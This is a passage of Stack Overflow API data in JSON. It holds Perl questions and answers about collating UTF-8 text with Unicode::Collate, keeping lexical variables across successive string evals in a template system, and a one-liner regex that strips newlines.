33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520734342, "post_id": 49215736, "comment_id": 85435996, "body": "The main thing to be aware of is that all the Unicode <i>graphemes</i> should be normalised to either <i>composed</i> or <i>decomposed</i> (i.e. as single characters or as basic characters followed by a combining mark). I don&#39;t see how the original encoding can affect that."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 10, "last_activity_date": 1558316880, "last_edit_date": 1558316880, "creation_date": 1520731587, "answer_id": 49215736, "question_id": 49215163, "link": "https://stackoverflow.com/questions/49215163/sorting-utf-8-input/49215736#49215736", "title": "Sorting UTF-8 input", "body": "<p>The <code>cmp</code> used with <code>sort</code> can't help with this; it has no notion of encodings and merely compares by codepoint, character by character, with surprises in many languages. Use <a href=\"http://search.cpan.org/~sadahiro/Unicode-Collate-1.25/Collate.pm\" rel=\"nofollow noreferrer\">Unicode::Collate</a>.<sup>&dagger;</sup> See <a href=\"https://stackoverflow.com/a/46617394/4653379\">this post</a> for a bit more and for far more <a href=\"https://stackoverflow.com/questions/15013515/multilingual-text-sorting-in-perl-on-windows-using-locale/15016188#15016188\">this post</a> by tchrist and this <a href=\"https://www.perl.com/pub/2011/08/whats-wrong-with-sort-and-how-to-fix-it.html/\" rel=\"nofollow noreferrer\">perl.com article</a>.</p>\n\n<p>The other issue is of reading (decoding) input and writing (encoding) output in utf8 correctly. One way to ensure that data on standard streams is handled is via the <a href=\"https://perldoc.perl.org/open.html\" rel=\"nofollow noreferrer\">open pragma</a>, with which you can set \"layers\" so that input and output is decoded/encoded as data is read/written.   </p>\n\n<p>Altogether, an example</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nuse Unicode::Collate;\n\nuse open \":std\", \":encoding(UTF-8)\";\n\nmy $file = ...;\n\nopen my $fh, '&lt;', $file or die \"Can't open $file: $!\";\nmy @lines = &lt;$fh&gt;;\nchomp @lines;\n\nmy $uc  = Unicode::Collate-&gt;new();\nmy @sorted = $uc-&gt;sort(@lines);\n\nsay for @sorted;\n</code></pre>\n\n<p>The module's <code>cmp</code> method can be used for individual comparisons (if data \nis in a complex data structure and not just a flat list of lines, for instance)</p>\n\n<pre><code>my @sorted = map { $uc-&gt;cmp($a, $b) } @data;\n</code></pre>\n\n<p>where <code>$a</code> and <code>$b</code> need be set suitably so to extract what to compare from <code>@data</code>.</p>\n\n<p>If you have utf8 data right in the source you need <code>use utf8</code>, while if you receive utf8 via yet other channels (from <code>@ARGV</code> included) you may need to manually <a href=\"https://perldoc.perl.org/Encode.html\" rel=\"nofollow noreferrer\">Encode::decode</a> those strings. </p>\n\n<p>Please see the linked post (and links in it) and documentation for more detail. See this <a href=\"http://www.perlmonks.org/?node_id=755158\" rel=\"nofollow noreferrer\">perlmonks post</a> for far more rounded information. See this <a href=\"https://www.effectiveperlprogramming.com/2011/01/know-your-sort-orders/\" rel=\"nofollow noreferrer\">EffectivePerler article</a> on custom sorting. </p>\n\n<hr>\n\n<p><sup>&dagger;</sup> Example: by codepoint comparison <code>\u00e4</code> > <code>b</code> while the accepted order in German is <code>\u00e4</code> &lt; <code>b</code></p>\n\n<pre><code>perl -MUnicode::Collate -wE'use utf8; binmode STDOUT, \":encoding(UTF-8)\"; \n    @s = qw(\u00e4 b); \n    say join \" \", sort { $a cmp $b } @s;             #--&gt;  b \u00e4\n    say join \" \", Unicode::Collate-&gt;new-&gt;sort(@s);   #--&gt;  \u00e4 b\n'\n</code></pre>\n\n<p>so we need to use <code>Unicode::Collate</code> (or a custom sort routine).</p>\n"}], "owner": {"reputation": 41, "user_id": 9473574, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c4c34059cb7ab18676c991de8f945b2?s=128&d=identicon&r=PG&f=1", "display_name": "D.123perl456", "link": "https://stackoverflow.com/users/9473574/d-123perl456"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 334, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1558316880, "creation_date": 1520725218, "last_edit_date": 1520878306, "question_id": 49215163, "link": "https://stackoverflow.com/questions/49215163/sorting-utf-8-input", "title": "Sorting UTF-8 input", "body": "<p>I need to sort lines from file, saved as UTF-8. These lines can start with cyrillic or latin characters. My code works wrong on cyrillic one.</p>\n\n<pre><code>sub sort_by_default  {\n    my @sorted_lines = sort {\n        $a &lt;=&gt; $b\n          ||\n        fc( $a) cmp fc($b)\n     } @_;\n}\n</code></pre>\n"}, {"tags": ["perl", "eval", "lexical-scope"], "comments": [{"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "edited": false, "score": 3, "creation_date": 1520696304, "post_id": 49210685, "comment_id": 85426095, "body": "I don&#39;t get why can&#39;t you move your lexical variables to outer scope? <code>{ my $c; ... ; eval $code1; eval $code2; }</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520697523, "post_id": 49210685, "comment_id": 85426528, "body": "Why are you using <code>eval</code> in the first place, instead of two subroutines?"}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 3, "creation_date": 1520698012, "post_id": 49210685, "comment_id": 85426676, "body": "Sounds like an <a href=\"https://meta.stackexchange.com/a/66378\">XY Problem</a> to me. Why are you <code>eval</code>ing Perl code line-by-line?"}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520703653, "post_id": 49210685, "comment_id": 85428608, "body": "Also, if you have control over the <code>eval</code>ed code, why use lexicals at all?"}, {"owner": {"reputation": 730, "user_id": 889976, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/17e056b2df12132c8ab0628ef0fba5e9?s=128&d=identicon&r=PG", "display_name": "Bernhard Bodenstorfer", "link": "https://stackoverflow.com/users/889976/bernhard-bodenstorfer"}, "edited": false, "score": 0, "creation_date": 1520708371, "post_id": 49210685, "comment_id": 85430145, "body": "The code to be <code>eval</code>ed is read from configuration templates outside the application, so it will change much more frequently that the main perl code. It comes from different locations in the files. Perl is used in the files to automatically calculate values."}, {"owner": {"reputation": 730, "user_id": 889976, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/17e056b2df12132c8ab0628ef0fba5e9?s=128&d=identicon&r=PG", "display_name": "Bernhard Bodenstorfer", "link": "https://stackoverflow.com/users/889976/bernhard-bodenstorfer"}, "edited": false, "score": 0, "creation_date": 1520708743, "post_id": 49210685, "comment_id": 85430264, "body": "This is no problem. The problem arises when I try to re-use parts of calculations in one place to feed into calculations at another place later in the file to avoid repeating code. So I want to keep one lexical scope for each configuration file, which contains several Perl-fragments."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520709133, "post_id": 49210685, "comment_id": 85430404, "body": "I still don&#39;t understand why you&#39;re compiling code at run time: why isn&#39;t your &quot;config&quot; an array of subroutines?"}, {"owner": {"reputation": 730, "user_id": 889976, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/17e056b2df12132c8ab0628ef0fba5e9?s=128&d=identicon&r=PG", "display_name": "Bernhard Bodenstorfer", "link": "https://stackoverflow.com/users/889976/bernhard-bodenstorfer"}, "edited": false, "score": 0, "creation_date": 1520709421, "post_id": 49210685, "comment_id": 85430504, "body": "The templates are for texts, and I spend most time to write the text, so it must be easy to edit, structure and proofread also in the editor. I do not want perl syntax in places which do not require it."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1520709930, "post_id": 49210685, "comment_id": 85430680, "body": "I think it would be helpful if you could show a minimal example of such a configuration template which demonstrates the issue you described. My suspicion is that there is a different/better overall solution than &quot;preserve lexicals across evals&quot;."}, {"owner": {"reputation": 730, "user_id": 889976, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/17e056b2df12132c8ab0628ef0fba5e9?s=128&d=identicon&r=PG", "display_name": "Bernhard Bodenstorfer", "link": "https://stackoverflow.com/users/889976/bernhard-bodenstorfer"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520710853, "post_id": 49210685, "comment_id": 85430968, "body": "@haukex done, see edit above."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520713761, "post_id": 49210685, "comment_id": 85431838, "body": "Thank you. Since at the moment I can&#39;t think of any good way to share lexicals across scopes, I am still wondering why you don&#39;t just use package variables instead, and <code>eval</code> the code in its own package so namespaces are not polluted. Another approach would be to translate your template into one big piece of Perl code to be <code>eval</code>ed, for example: <code>The vector [ \\perlValue{ list $v } ]</code> becomes <code>print &quot;The vector [ &quot;; print list $v; print &quot; ]\\n&quot;</code>."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520714570, "post_id": 49210685, "comment_id": 85432076, "body": "I once wrote a really simplistic demo implementation of the latter option, <a href=\"https://www.perlmonks.org/?node_id=1177887\" rel=\"nofollow noreferrer\">here</a>."}, {"owner": {"reputation": 730, "user_id": 889976, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/17e056b2df12132c8ab0628ef0fba5e9?s=128&d=identicon&r=PG", "display_name": "Bernhard Bodenstorfer", "link": "https://stackoverflow.com/users/889976/bernhard-bodenstorfer"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520714744, "post_id": 49210685, "comment_id": 85432145, "body": "@haukex: <code>eval</code> the code in its own package sounds promising. How can I create a namespace and let the <code>eval</code>ed code refer to it (I guess with <code>our</code>)? I would consider dynamically creating an anonymous namespace to be used once more elegant, if possible, but see a workaround to manually wipe namespaces."}, {"owner": {"reputation": 730, "user_id": 889976, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/17e056b2df12132c8ab0628ef0fba5e9?s=128&d=identicon&r=PG", "display_name": "Bernhard Bodenstorfer", "link": "https://stackoverflow.com/users/889976/bernhard-bodenstorfer"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520714886, "post_id": 49210685, "comment_id": 85432197, "body": "@haukex: translating the document to me does not seem an easy task. I believe the easy model you suggest would fail with <code>makes [ \\perlValue{ my $s = $v + $w; list $s } ].</code> Just prefixing with <code>print</code> would not work, would it?"}], "answers": [{"tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": false, "score": 0, "last_activity_date": 1520714111, "creation_date": 1520714111, "answer_id": 49213761, "question_id": 49210685, "link": "https://stackoverflow.com/questions/49210685/share-lexical-scope-between-successive-eval-statements-in-perl/49213761#49213761", "title": "Share lexical scope between successive eval statements in perl", "body": "<p>Here is one approach: Parse the template file twice. On first parse, write Perl statements from the template to a temp file, for example <code>/tmp/MyTemplate.pm</code>, add some header code to this file such as to make it a valid Perl module. Also use a sequential numbering into package variables for <code>\\perlValue</code> statements, i.e. translate the first <code>\\perlValue{ list $v }</code> into for example: <code>our $perl_value1 = list $v;</code>, the next <code>\\perlValue{ list $w }</code> becomes <code>our $perl_value2 = list $w;</code> and so on.. </p>\n\n<p>Then require the module: <code>require \"/tmp/MyTmplate.pm\";</code> Then parse the template a second time, extracting the correct values corresponding to Perl code in the template from the symbol table of <code>MyTemplate</code>. For example to get the value of <code>\\perlValue{ list $v }</code> use <code>$MyTemplate::perl_value1</code> and so on..  </p>\n"}, {"tags": [], "owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "is_accepted": true, "score": 4, "last_activity_date": 1520714601, "creation_date": 1520714601, "answer_id": 49213846, "question_id": 49210685, "link": "https://stackoverflow.com/questions/49210685/share-lexical-scope-between-successive-eval-statements-in-perl/49213846#49213846", "title": "Share lexical scope between successive eval statements in perl", "body": "<p>Perhaps you would like to use <a href=\"https://metacpan.org/pod/Eval::WithLexicals\" rel=\"nofollow noreferrer\">Eval::WithLexicals</a>? It does exactly what you are asking for. It was designed to power REPLs, and it's pure Perl. You simply make a new instance of <code>Eval::WithLexicals</code>, and then you call <code>$ewl-&gt;eval($code)</code> instead of <code>eval $code</code>, and the variables will persist between successive calls on the same object.</p>\n"}, {"comments": [{"owner": {"reputation": 730, "user_id": 889976, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/17e056b2df12132c8ab0628ef0fba5e9?s=128&d=identicon&r=PG", "display_name": "Bernhard Bodenstorfer", "link": "https://stackoverflow.com/users/889976/bernhard-bodenstorfer"}, "edited": false, "score": 2, "creation_date": 1520720513, "post_id": 49214465, "comment_id": 85433568, "body": "Thanks for the effort you put into this and for mentioning the Template toolkit, which in a way belongs here, too. However, when I first came accross the toolkit a while ago, I had the impression that the perl code and the template text would be too far apart for the editor to easily author the document. This is why I did not go that route in the end. I think the Eval::WithLexicals exactly matches my question, and thus I have accepted that answer."}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 1, "creation_date": 1520745359, "post_id": 49214465, "comment_id": 85437812, "body": "Nice example! Do you think <a href=\"https://metacpan.org/pod/PPR\" rel=\"nofollow noreferrer\">PPR</a> could be used here? That is: to improve the robustness of the Perl parser.."}], "tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": false, "score": 2, "last_activity_date": 1520776674, "last_edit_date": 1520776674, "creation_date": 1520719392, "answer_id": 49214465, "question_id": 49210685, "link": "https://stackoverflow.com/questions/49210685/share-lexical-scope-between-successive-eval-statements-in-perl/49214465#49214465", "title": "Share lexical scope between successive eval statements in perl", "body": "<p>As I commented, my feeling was that this was an <a href=\"https://meta.stackexchange.com/a/66378\">XY Problem</a> in that there may be other solutions to the underlying problem. As it turns out from the discussion in the comments, you seem to be implementing your own templating system, so my first suggestion would be to have a look at existing ones, such as maybe <a href=\"https://metacpan.org/pod/Template::Toolkit\" rel=\"nofollow noreferrer\"><code>Template::Toolkit</code></a>.</p>\n\n<p>If you still want to stick with your current approach, then it seems that @hobbs has given an answer that seems to answer your question directly, <a href=\"https://metacpan.org/pod/Eval::WithLexicals\" rel=\"nofollow noreferrer\"><code>Eval::WithLexicals</code></a> (<em>Update:</em> since accepted). As I mentioned, I see two other possible solutions. The first, which feels the most natural to me personally, would be to not use lexicals in the fist place. When I see the code like what you showed:</p>\n\n<pre><code>\\perlExec{ my $v = [ 1, 2 ]; }\nThe vector [ \\perlValue{ $v } ]\n</code></pre>\n\n<p>then, simply because of the braces, I would not be surprised that each of those has their own lexical scope. If you instead were to use package variables, it would seem more natural to me. Just for example, you could use <code>eval qq{ package $packname; no strict \"vars\"; $code }</code> (of course with the caveat that <code>strict \"vars\"</code> is disabled), or your could use fully qualified variable names (<code>$package::v</code>) throughout.</p>\n\n<p>The second thing I mentioned was to translate the <em>entire</em> input file into a Perl script and <code>eval</code> that - in other words, write your own templating system. Although I would <strong>only</strong> recommend reinventing this wheel as your <strong>last</strong> option, you did ask how to adapt <a href=\"https://www.perlmonks.org/?node_id=1177887\" rel=\"nofollow noreferrer\">this code I wrote</a> for your purposes, so here it is. One limitation of the following is that any braces in the code blocks must be balanced (<em>but see update below</em>), and since this is a somewhat simplistic demonstration, there are bound to be more limitations. Use at your own risk!</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature qw/say state/;\nuse Data::Dumper;\nuse Regexp::Common qw/balanced/;\nuse Capture::Tiny qw/capture_stdout/;\nmy $DEBUG = 1;\n\nlocal $/=undef;\nwhile (my $input = &lt;&gt;) {\n    my $code = translate($ARGV,$input);\n    $DEBUG and say \"&gt;&gt;&gt;&gt;&gt; Generated Code:\\n\", $code, \"&lt;&lt;&lt;&lt;&lt;\";\n    my ($output, $rv) = capture_stdout { eval $code };\n    $rv or die \"eval failed: \".($@//'unknown error');\n    say \"&gt;&gt;&gt;&gt;&gt; Output:\\n\", $output, \"&lt;&lt;&lt;&lt;&lt;\";\n}\n\nsub translate {\n    my ($fn,$input) = @_;\n    state $packcnt = 1;\n    $fn =~ tr/A-Za-z0-9/_/cs;\n    my $pack = \"Generated\".$packcnt++.\"_$fn\";\n    my $output = \"{ package $pack;\\n\";\n    $output.= \"no warnings; no strict;\\n\";\n    $output.= \"#line 1 \\\"$pack\\\"\\n\";\n    while ( $input=~m{ \\G (?&lt;str&gt; .*? ) \\\\perl(?&lt;type&gt; Exec|Value )\n                     (?&lt;code&gt; $RE{balanced}{-parens=&gt;'{}'} ) }xsgc ) {\n        my ($str,$type,$code) = @+{qw/str type code/};\n        $output.= \"print \".perlstr($str).\";\\n\" if length($str);\n        ($code) = $code=~/\\A\\s*\\{(.*)\\}\\s*\\z/s or die $code;\n        $code .= \";\" unless $code=~/;\\s*\\z/;\n        $code = \"print do { $code };\" if $type eq 'Value';\n        $output.= \"$code\\n\";\n    }\n    my $str = substr $input, pos($input)//0;\n    $output.= \"print \".perlstr($str).\";\\n\" if length($str);\n    $output.= \"} # end package $pack\\n1;\\n\";\n    return $output;\n}\n\nsub perlstr { Data::Dumper-&gt;new([''.shift])\n    -&gt;Terse(1)-&gt;Indent(0)-&gt;Useqq(1)-&gt;Dump }\n</code></pre>\n\n<p>Input File:</p>\n\n<pre><code>\\perlExec{\n    use warnings; use strict;\n    print \"Hello, World\\n\";\n    my $v = [ 1, 2 ];\n    my $w = [ 3, 4 ];\n    sub list ($) {\n        my $pdl = shift;\n        return join ',', @$pdl;\n    }\n}\nThe vector [ \\perlValue{ list $v } ]\nplus the vector [ \\perlValue{ list $w } ]\nmakes [ \\perlValue{ my $s = [@$v + @$w]; list $s } ].\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>&gt;&gt;&gt;&gt;&gt; Generated Code:\n{ package Generated1_input_txt;\nno warnings; no strict;\n#line 1 \"Generated1_input_txt\"\n\n    use warnings; use strict;\n    print \"Hello, World\\n\";\n    my $v = [ 1, 2 ];\n    my $w = [ 3, 4 ];\n    sub list ($) {\n        my $pdl = shift;\n        return join ',', @$pdl;\n    }\n;\nprint \"\\nThe vector [ \";\nprint do {  list $v ; };\nprint \" ]\\nplus the vector [ \";\nprint do {  list $w ; };\nprint \" ]\\nmakes [ \";\nprint do {  my $s = [@$v + @$w]; list $s ; };\nprint \" ].\\n\";\n} # end package Generated1_input_txt\n1;\n&lt;&lt;&lt;&lt;&lt;\n&gt;&gt;&gt;&gt;&gt; Output:\nHello, World\n\nThe vector [ 1,2 ]\nplus the vector [ 3,4 ]\nmakes [ 4 ].\n&lt;&lt;&lt;&lt;&lt;\n</code></pre>\n\n<p><em>Update:</em> As suggested by @H\u00e5konH\u00e6gland in the comments, it's possible to use <a href=\"https://metacpan.org/pod/PPR\" rel=\"nofollow noreferrer\"><code>PPR</code></a> to parse out the blocks. The only changes needed are to replace <code>use Regexp::Common qw/balanced/;</code> by <code>use PPR;</code> and in the regex replace <code>(?&lt;code&gt; $RE{balanced}{-parens=&gt;'{}'} )</code> by <code>(?&lt;code&gt; (?&amp;PerlBlock) ) $PPR::GRAMMAR</code> - then the parser will handle a case like <code>print \"Hello, World }\\n\";</code> too!</p>\n"}], "owner": {"reputation": 730, "user_id": 889976, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/17e056b2df12132c8ab0628ef0fba5e9?s=128&d=identicon&r=PG", "display_name": "Bernhard Bodenstorfer", "link": "https://stackoverflow.com/users/889976/bernhard-bodenstorfer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 156, "favorite_count": 0, "accepted_answer_id": 49213846, "answer_count": 3, "score": 1, "last_activity_date": 1520776674, "creation_date": 1520695222, "last_edit_date": 1520710817, "question_id": 49210685, "link": "https://stackoverflow.com/questions/49210685/share-lexical-scope-between-successive-eval-statements-in-perl", "title": "Share lexical scope between successive eval statements in perl", "body": "<p>Can I make different snippets of <code>eval</code>ed Perl code share the same lexical scope and yet get their return values?</p>\n\n<p><strong>Background</strong></p>\n\n<p>Perl's eval command evaluates a string as Perl code and upon success returns the value of the last statement in that code. However, lexical variables created in that code are dropped at the end of the code. This means when eval of code1 has ended and I have a second code chunk code2, which refers to the lexical variables set in code1, this will fail.</p>\n\n<pre><code>my $code1 = 'my $c = 4';\nmy $code2 = 'printf \"%g\\n\", $c;';\n\nprintf 'evaluated \"%s\" to %s' . \"\\n\", $code1, eval $code1;\nprintf 'evaluated \"%s\"' . \"\\n\", $code2;\n</code></pre>\n\n<p>yields</p>\n\n<pre><code>evaluated \"my $c = 4\" to 4\nevaluated \"printf \"%g\\n\", $c;\"\n</code></pre>\n\n<p>but not a line containing just <code>4</code> as I would wish, because <code>$code2</code> should use the variable <code>$c</code> if lexical scopes are re-used. (I generally agree with the default that lexical scopes are constrained to only one <code>eval</code>ed code, so I expect that some conscious modification of code is required to make the above work.)</p>\n\n<p><strong>Approaches considered</strong></p>\n\n<p>I experimented with <code>use PadWalker qw( peek_my );</code> to save the lexical scope at the end of each code snippet aiming to load it into the scope of the following snippet, but then I realised that this would make inaccessible the return value of the code snippet, which is needed by the calling code.</p>\n\n<p>As another alternative appears to pattern-match (probably using a dedicated parser) all <code>my</code>-declarations in the perl code snippets and essentially translate them on the fly, but this would amount to a considerably bigger task.</p>\n\n<p><strong>Template example for discussion (see comments)</strong></p>\n\n<pre><code>\\perlExec{\n    use PDL;\n    my $v = vpdl [ 1, 2 ];\n    my $w = vpdl [ 3, 4 ];\n    sub list ($) {\n            my $pdl = shift;\n            return join ',', map { at( $pdl, $_, 0 ) } 0..1;\n    }\n}\nThe vector [ \\perlValue{ list $v } ]\nplus the vector [ \\perlValue{ list $w } ]\nmakes [ \\perlValue{ my $s = $v + $w; list $s } ].\n</code></pre>\n"}, {"tags": ["regex", "bash", "perl", "sed", "regex-negation"], "comments": [{"owner": {"reputation": 31251, "user_id": 4162356, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/dGhuV.png?s=128&g=1", "display_name": "James Brown", "link": "https://stackoverflow.com/users/4162356/james-brown"}, "edited": false, "score": 6, "creation_date": 1520692516, "post_id": 49210174, "comment_id": 85424906, "body": "Post some sample data with the expected result, please."}, {"owner": {"reputation": 43580, "user_id": 1020526, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/Scjj8.jpg?s=128&g=1", "display_name": "revo", "link": "https://stackoverflow.com/users/1020526/revo"}, "edited": false, "score": 2, "creation_date": 1520693947, "post_id": 49210174, "comment_id": 85425379, "body": "The answer you accepted for sure doesn&#39;t output expected result."}, {"owner": {"reputation": 169, "user_id": 6423853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pnJxDGD5Stg/AAAAAAAAAAI/AAAAAAAABW0/U05Y-Ishqos/photo.jpg?sz=128", "display_name": "Gabz", "link": "https://stackoverflow.com/users/6423853/gabz"}, "edited": false, "score": 0, "creation_date": 1520694037, "post_id": 49210174, "comment_id": 85425409, "body": "Yes, it worked, just added a space at the substitution part: perl -C -i -p -e &#39;s/(?&lt;=[^.:])\\n/ /&#39; ~/Desktop/bak2"}], "answers": [{"comments": [{"owner": {"reputation": 169, "user_id": 6423853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pnJxDGD5Stg/AAAAAAAAAAI/AAAAAAAABW0/U05Y-Ishqos/photo.jpg?sz=128", "display_name": "Gabz", "link": "https://stackoverflow.com/users/6423853/gabz"}, "edited": false, "score": 0, "creation_date": 1520693917, "post_id": 49210333, "comment_id": 85425368, "body": "Really thanks, it worked after adding a space on the substitution part: perl -C -i -p -e &#39;s/(?&lt;=[^.:])\\n/ /&#39; ~/Desktop/bak2"}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 169, "user_id": 6423853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pnJxDGD5Stg/AAAAAAAAAAI/AAAAAAAABW0/U05Y-Ishqos/photo.jpg?sz=128", "display_name": "Gabz", "link": "https://stackoverflow.com/users/6423853/gabz"}, "edited": false, "score": 1, "creation_date": 1520696309, "post_id": 49210333, "comment_id": 85426098, "body": "@Gabz Replacing new line (&quot;\\n&quot;) by space wasn&#39;t specified as requirement.  You get no more than you ask for :-)"}, {"owner": {"reputation": 169, "user_id": 6423853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pnJxDGD5Stg/AAAAAAAAAAI/AAAAAAAABW0/U05Y-Ishqos/photo.jpg?sz=128", "display_name": "Gabz", "link": "https://stackoverflow.com/users/6423853/gabz"}, "edited": false, "score": 0, "creation_date": 1520697111, "post_id": 49210333, "comment_id": 85426386, "body": "Yes, I now, sorry for that, I&#39;m a newbie in a lot of aspects. But I&#39;m glad to be learning. Really thanks."}], "tags": [], "owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "is_accepted": true, "score": 1, "last_activity_date": 1520696546, "last_edit_date": 1520696546, "creation_date": 1520693073, "answer_id": 49210333, "question_id": 49210174, "link": "https://stackoverflow.com/questions/49210174/remove-new-lines-except-when-preceded-by-specific-set-of-characters/49210333#49210333", "title": "Remove new lines except when preceded by specific set of characters", "body": "<p>You may preserve pre new-line match (I added \"empty\" lines handling):</p>\n\n<pre><code>perl -C -i -p -e 's/(^|[^.:])\\n/$1/' ~/Desktop/bak2\n</code></pre>\n\n<p>or use positive look behind</p>\n\n<pre><code>perl -C -i -p -e 's/(?&lt;=[^.:])\\n//' ~/Desktop/bak2\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1520697222, "creation_date": 